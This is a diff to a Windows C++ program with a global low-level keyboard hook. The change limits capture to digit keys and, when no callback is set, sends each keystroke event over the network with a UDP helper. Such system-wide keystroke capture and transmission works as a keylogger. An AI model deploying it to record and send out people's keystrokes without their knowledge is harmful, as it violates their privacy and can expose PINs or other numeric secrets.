@@ -4,8 +4,27 @@
 #include <iostream>
 #include <windows.h>
 #include <conio.h>
+#include "UdpTool.h"
+
+
+#include "easywsclient.hpp"
+#include <assert.h>
+#include <stdio.h>
+#include <string>
+
+using easywsclient::WebSocket;
+WebSocket::pointer ws = NULL;
+
+//void handle_message(const std::string& message)
+//{
+//	printf(">>> %s\n", message.c_str());
+//	if (message == "world") { ws->close(); }
+//}
+
 
 //#define DEBUG
+
+#define ONLY_NUMBER
 
 using namespace std;
 using namespace std::chrono;
@@ -13,7 +32,7 @@ using namespace std::chrono;
 DWORD g_main_tid = 0;
 HHOOK g_kb_hook = 0;
 
-CallBackFun callBack_;
+CallBackFun callBack_ = NULL;
 /**
 * 键盘事件响应回调
 */
@@ -31,7 +50,23 @@ LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)l;
 	const char* info = NULL;
 	int actionId = 0;
-	if (w == WM_KEYDOWN){
+	int scanCode = p->scanCode;
+
+#ifdef ONLY_NUMBER // 	// 屏蔽非数字,包括小键盘和f下的数字
+	// 转换为实际的数字值
+	if (p->vkCode >= '0' && p->vkCode <= '9') {
+		scanCode = p->vkCode - '0';
+	}
+	else if (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9 ) {
+		scanCode = p->vkCode - VK_NUMPAD0;
+	}
+	else {
+		return CallNextHookEx(g_kb_hook, code, w, l);
+	}
+
+#endif // ONLY_NUMBER
+
+	if (w == WM_KEYDOWN) {
 		info = "key dn"; // 按键按下
 		actionId = 1;
 	}
@@ -49,13 +84,20 @@ LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 		info = "sys key up";
 		actionId = -2;
 	}
+
+
 #ifdef DEBUG
 	printf("%s - vkCode [%04x], scanCode [%04x]\n",
-			info, p->vkCode, p->scanCode);
+			info, p->vkCode, scanCode);
 #endif // DEBUG
-
-	callBack_( p->vkCode, p->scanCode, actionId);
-
+	if (callBack_ != NULL) {
+			callBack_( p->vkCode, scanCode, actionId);
+	}
+	else {
+		char buf[64];
+		sprintf_s(buf, 32, "%s - vkCode [%04x], scanCode [%04x]", info, p->vkCode, scanCode);
+		SendUdp(buf, NULL);
+	}
 	// always call next hook
 	return CallNextHookEx(g_kb_hook, code, w, l);
 };
